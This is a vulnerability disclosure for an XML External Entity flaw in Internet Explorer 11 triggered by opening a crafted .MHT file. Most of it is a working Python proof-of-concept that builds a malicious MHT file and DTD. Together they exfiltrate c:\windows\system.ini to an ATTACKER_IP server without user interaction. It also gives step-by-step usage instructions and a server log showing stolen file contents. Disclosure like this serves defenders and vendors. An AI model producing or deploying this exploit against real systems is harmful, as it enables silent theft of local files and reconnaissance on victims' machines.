[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt
[+] ISR: ApparitionSec          
 

[Vendor]
www.microsoft.com


[Product]
Microsoft Internet Explorer v11
(latest version)

Internet Explorer is a series of graphical web browsers developed by Microsoft and included in the Microsoft Windows line of operating systems, starting in 1995.


[Vulnerability Type]
XML External Entity Injection



[CVE Reference]
N/A



[Security Issue]
Internet Explorer is vulnerable to XML External Entity attack if a user opens a specially crafted .MHT file locally.

This can allow remote attackers to potentially exfiltrate Local files and conduct remote reconnaissance on locally installed
Program version information. Example, a request for "c:\Python27\NEWS.txt" can return version information for that program.

Upon opening the malicious ".MHT" file locally it should launch Internet Explorer. Afterwards, user interactions like duplicate tab "Ctrl+K"
and other interactions like right click "Print Preview" or "Print" commands on the web-page may also trigger the XXE vulnerability.

However, a simple call to the window.print() Javascript function should do the trick without requiring any user interaction with the webpage.

Typically, when instantiating ActiveX Objects like "Microsoft.XMLHTTP" users will get a security warning bar in IE and be prompted
to activate blocked content. However, when opening a specially crafted .MHT file using malicious <xml> markup tags the user will get no such
active content or security bar warnings.

e.g.

C:\sec>python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
127.0.0.1 - - [10/Apr/2019 20:56:28] "GET /datatears.xml HTTP/1.1" 200 -
127.0.0.1 - - [10/Apr/2019 20:56:28] "GET /?;%20for%2016-bit%20app%20support[386Enh]woafont=dosapp.fonEGA80WOA.FON=EGA80WOA.FONEGA40WOA.FON=EGA40WOA.FONCGA80WOA.FON=CGA80WOA.FONCGA40WOA.FON=CGA40WOA.FON[drivers]wave=mmdrv.dlltimer=timer.drv[mci] HTTP/1.1" 200 -


Tested successfully in latest Internet Explorer Browser v11 with latest security patches on Win7/10 and Server 2012 R2.



[POC/Video URL]
https://vimeo.com/329717404



[Exploit/POC]
POC to exfil  Windows "system.ini" file.
Note: Edit attacker server IP in the script to suit your needs.

1) Use below script to create the "datatears.xml" XML and XXE embedded "msie-xxe-0day.mht" MHT file.

2) python -m SimpleHTTPServer

3) Place the generated "datatears.xml" in Python server web-root.

4) Open the generated "msie-xxe-0day.mht" file, watch your files be exfiltrated.


#Microsoft Internet Explorer XXE 0day
#Creates malicious XXE .MHT and XML files
#Open the MHT file in MSIE locally, should exfil system.ini
#By hyp3rlinx 
#ApparitionSec

ATTACKER_IP="localhost"
PORT="8000"

mht_file=(
&#039;From:\n&#039;
&#039;Subject:\n&#039;
&#039;Date:\n&#039;
&#039;MIME-Version: 1.0\n&#039;
&#039;Content-Type: multipart/related; type="text/html";\n&#039;
&#039;\tboundary="=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001"\n&#039;
&#039;This is a multi-part message in MIME format.\n\n\n&#039;

&#039;--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001\n&#039;
&#039;Content-Type: text/html; charset="UTF-8"\n&#039;
&#039;Content-Location: main.htm\n\n&#039;

&#039;<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/transitional.dtd">\n&#039;
&#039;<html>\n&#039;
&#039;<head>\n&#039;
&#039;<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\n&#039;
&#039;<title>MSIE XXE 0day</title>\n&#039;
&#039;</head>\n&#039;
&#039;<body>\n&#039;
&#039;<xml>\n&#039;
&#039;<?xml version="1.0" encoding="utf-8"?>\n&#039;
&#039;<!DOCTYPE r [\n&#039;
&#039;<!ELEMENT r ANY >\n&#039;
&#039;<!ENTITY % sp SYSTEM "http://&#039;+str(ATTACKER_IP)+":"+PORT+&#039;/datatears.xml">\n&#039;
&#039;%sp;\n&#039;
&#039;%param1;\n&#039;
&#039;]>\n&#039;
&#039;<r>&exfil;</r>\n&#039;
&#039;<r>&exfil;</r>\n&#039;
&#039;<r>&exfil;</r>\n&#039;
&#039;<r>&exfil;</r>\n&#039;
&#039;</xml>\n&#039;
&#039;<script>window.print();</script>\n&#039;
&#039;<table cellpadding="0" cellspacing="0" border="0">\n&#039;
&#039;<tr>\n&#039;
&#039;<td class="contentcell-width">\n&#039;
&#039;<h1>MSIE XML External Entity 0day PoC.</h1>\n&#039;
&#039;<h3>Discovery: hyp3rlinx</h3>\n&#039;
&#039;<h3>ApparitionSec</h3>\n&#039;
&#039;</td>\n&#039;
&#039;</tr>\n&#039;
&#039;</table>\n&#039;
&#039;</body>\n&#039;
&#039;</html>\n\n\n&#039;

&#039;--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001--&#039;
)

xml_file=(
&#039;<!ENTITY % data SYSTEM "c:\windows\system.ini">\n&#039;
&#039;<!ENTITY % param1 "<!ENTITY exfil SYSTEM \&#039;http://&#039;+str(ATTACKER_IP)+":"+PORT+&#039;/?%data;\&#039;>">\n&#039;
&#039;<!ENTITY % data SYSTEM "file:///c:/windows/system.ini">\n&#039;
&#039;<!ENTITY % param1 "<!ENTITY exfil SYSTEM \&#039;http://&#039;+str(ATTACKER_IP)+":"+PORT+&#039;/?%data;\&#039;>">\n&#039;
)

def mk_msie_0day_filez(f,p):
    f=open(f,"wb")
    f.write(p)
    f.close()


if __name__ == "__main__":
    mk_msie_0day_filez("msie-xxe-0day.mht",mht_file)
    mk_msie_0day_filez("datatears.xml",xml_file)
    print "Microsoft Internet Explorer XML External Entity 0day PoC."
    print "Files msie-xxe-0day.mht and datatears.xml Created!."
    print "Discovery: Hyp3rlinx / Apparition Security"



